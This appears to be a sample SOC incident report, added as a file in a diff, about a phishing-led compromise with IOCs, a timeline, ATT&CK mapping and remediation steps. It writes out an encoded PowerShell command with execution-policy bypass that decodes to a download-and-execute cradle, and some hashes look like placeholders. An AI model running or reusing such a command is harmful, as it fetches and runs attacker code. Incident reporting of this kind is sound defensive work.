@@ -1,0 +1,447 @@
+====================================================================
+                  CYBER SECURITY INCIDENT REPORT
+====================================================================
+
+Incident ID: INC-2026-0001
+Report Date: 07 August 2026
+Classification: Confidential
+Organization: ABC Financial Services
+Prepared By: Security Operations Center (SOC)
+
+====================================================================
+EXECUTIVE SUMMARY
+====================================================================
+
+On 07 August 2026, the Security Operations Center detected suspicious
+activity originating from an employee workstation in the Finance
+department. Multiple failed login attempts were followed by a successful
+authentication from an unusual external IP address.
+
+Shortly after authentication, PowerShell executed an encoded command,
+downloaded a malicious payload, established communication with a remote
+Command and Control (C2) server, and exfiltrated sensitive financial
+documents outside the corporate network.
+
+The incident is believed to have started from a phishing email carrying
+a disguised executable attachment.
+
+Overall Severity: CRITICAL
+
+====================================================================
+AFFECTED ASSET INFORMATION
+====================================================================
+
+Hostname:
+FINANCE-PC-07
+
+Operating System:
+Windows 11 Enterprise
+
+Department:
+Finance
+
+Username:
+john.smith
+
+Internal IP Address:
+192.168.10.25
+
+MAC Address:
+00-1A-2B-3C-4D-5E
+
+Device Status:
+Isolated after SOC investigation
+
+====================================================================
+NETWORK INFORMATION
+====================================================================
+
+Source IP:
+192.168.10.25
+
+Destination IP:
+185.244.25.17
+
+Secondary Destination IP:
+45.91.203.56
+
+Protocol:
+HTTPS
+
+Destination Port:
+443
+
+Connection Duration:
+12 Minutes
+
+Country:
+Russia
+
+Bytes Uploaded:
+1.8 GB
+
+DNS Requests Observed:
+secure-update-check.com
+cdn-security-sync.net
+
+====================================================================
+EMAIL DETAILS
+====================================================================
+
+Sender:
+support@company-security-alert.com
+
+Recipient:
+john.smith@abcfinance.com
+
+Subject:
+Mandatory Security Update
+
+Attachment:
+Security_Update.pdf.exe
+
+Attachment Size:
+1.9 MB
+
+Email Gateway Result:
+Delivered Successfully
+
+Spam Score:
+Low
+
+====================================================================
+AUTHENTICATION LOGS
+====================================================================
+
+08:51:12 - Failed Login
+08:51:38 - Failed Login
+08:52:04 - Failed Login
+08:53:19 - Successful Login
+
+Authentication Source:
+185.244.25.17
+
+Authentication Method:
+Password
+
+Multi-Factor Authentication:
+Disabled
+
+====================================================================
+PROCESS EXECUTION
+====================================================================
+
+Parent Process:
+explorer.exe
+
+Executed Process:
+powershell.exe
+
+Child Process:
+cmd.exe
+
+PowerShell Command:
+
+powershell.exe -ExecutionPolicy Bypass -EncodedCommand
+SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABp
+AGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
+
+Downloaded File:
+invoice_update.exe
+
+Execution Status:
+Successful
+
+====================================================================
+PERSISTENCE
+====================================================================
+
+Registry Key:
+
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
+Persistence File:
+
+C:\Users\john.smith\AppData\Roaming\Microsoft\Windows\update.exe
+
+Scheduled Task:
+Windows Security Update
+
+====================================================================
+FILE INFORMATION
+====================================================================
+
+Malicious File:
+invoice_update.exe
+
+MD5:
+7A1F8D34D3A2BFE112FAABCCDD223344
+
+SHA1:
+C2A19A9B1D0EAF82123456789ABCDEFF12345678
+
+SHA256:
+A71D4A1F92C2D15A9E0FA70F95C1BC74B618EC741DE2AA4B4A0B7CF54A8D8819
+
+File Size:
+3.6 MB
+
+Detection Name:
+Trojan.Generic.Agent
+
+====================================================================
+INDICATORS OF COMPROMISE (IOCs)
+====================================================================
+
+Malicious IP:
+185.244.25.17
+
+Secondary IP:
+45.91.203.56
+
+Internal IP:
+192.168.10.25
+
+Domain:
+secure-update-check.com
+
+Backup Domain:
+cdn-security-sync.net
+
+Email:
+support@company-security-alert.com
+
+Downloaded File:
+invoice_update.exe
+
+Registry Path:
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
+SHA256:
+A71D4A1F92C2D15A9E0FA70F95C1BC74B618EC741DE2AA4B4A0B7CF54A8D8819
+
+====================================================================
+SECURITY EVENTS
+====================================================================
+
+EDR Alert Generated
+Firewall High Severity Alert
+SIEM Correlation Alert
+Suspicious PowerShell Execution
+Credential Theft Detected
+Suspicious DNS Request
+Abnormal Outbound Traffic
+Large Data Transfer Detected
+
+====================================================================
+TIMELINE
+====================================================================
+
+08:40
+Phishing email delivered
+
+08:41
+User opened attachment
+
+08:42
+Malicious executable launched
+
+08:43
+PowerShell executed encoded command
+
+08:44
+Persistence registry key created
+
+08:45
+Malware contacted remote server
+
+08:46
+Credential dumping initiated
+
+08:48
+Communication established with Command & Control server
+
+08:50
+Sensitive documents collected
+
+08:55
+Files compressed
+
+09:01
+Data exfiltration started
+
+09:12
+Outbound transfer completed
+
+09:18
+SOC generated Critical Alert
+
+09:20
+Endpoint isolated
+
+====================================================================
+ATTACK TECHNIQUES (MITRE ATT&CK)
+====================================================================
+
+T1566 - Phishing
+
+T1059.001 - PowerShell
+
+T1003 - Credential Dumping
+
+T1041 - Exfiltration Over Command and Control Channel
+
+T1547 - Registry Run Keys
+
+T1071.001 - Web Protocols
+
+====================================================================
+RELATED CVEs
+====================================================================
+
+CVE-2023-23397
+
+CVE-2021-34527
+
+====================================================================
+BUSINESS IMPACT
+====================================================================
+
+Sensitive financial documents exposed.
+
+Employee credentials compromised.
+
+Risk of lateral movement inside corporate network.
+
+Possible ransomware deployment.
+
+Potential customer information leakage.
+
+Possible compliance violations.
+
+Business operations temporarily interrupted.
+
+====================================================================
+ROOT CAUSE
+====================================================================
+
+The user received a phishing email disguised as a mandatory security
+update.
+
+The attachment executed malware which established persistence, stole
+credentials, communicated with an external Command & Control server,
+and exfiltrated confidential information.
+
+====================================================================
+CONTAINMENT ACTIONS
+====================================================================
+
+Immediately isolate FINANCE-PC-07.
+
+Disable compromised user account.
+
+Block malicious IP addresses.
+
+Block malicious domains.
+
+Terminate PowerShell process.
+
+Remove persistence registry entries.
+
+Block outbound communication to malicious servers.
+
+====================================================================
+ERADICATION
+====================================================================
+
+Remove all malicious files.
+
+Delete registry persistence.
+
+Perform full antivirus scan.
+
+Reimage compromised workstation.
+
+Reset user credentials.
+
+Rotate privileged passwords.
+
+Scan neighboring endpoints.
+
+====================================================================
+RECOVERY
+====================================================================
+
+Restore clean backup.
+
+Reconnect workstation after verification.
+
+Monitor endpoint for 30 days.
+
+Monitor outbound traffic.
+
+Verify Active Directory integrity.
+
+Review SIEM alerts.
+
+====================================================================
+RECOMMENDATIONS
+====================================================================
+
+Enable Multi-Factor Authentication.
+
+Deploy advanced email filtering.
+
+Enable Microsoft Defender Attack Surface Reduction Rules.
+
+Restrict PowerShell execution.
+
+Implement DNS filtering.
+
+Keep systems fully patched.
+
+Conduct phishing awareness training.
+
+Perform regular vulnerability assessments.
+
+Implement Zero Trust Architecture.
+
+Conduct periodic threat hunting.
+
+====================================================================
+THREAT INTELLIGENCE
+====================================================================
+
+Threat Actor:
+APT29
+
+Aliases:
+Cozy Bear
+The Dukes
+
+Target Industry:
+Finance
+Healthcare
+Government
+
+Motivation:
+Cyber Espionage
+Credential Theft
+Data Exfiltration
+
+====================================================================
+FINAL SOC ASSESSMENT
+====================================================================
+
+The incident represents a successful phishing-based compromise resulting
+in credential theft, malicious PowerShell execution, persistence,
+Command and Control communication, and data exfiltration.
+
+The attack demonstrates characteristics commonly associated with
+Advanced Persistent Threat (APT) activity.
+
+Immediate containment and eradication actions have been completed.
+Continuous monitoring is recommended for at least 30 days to ensure
+there are no remaining indicators of compromise or attacker persistence.
+
+========================= END OF REPORT =============================
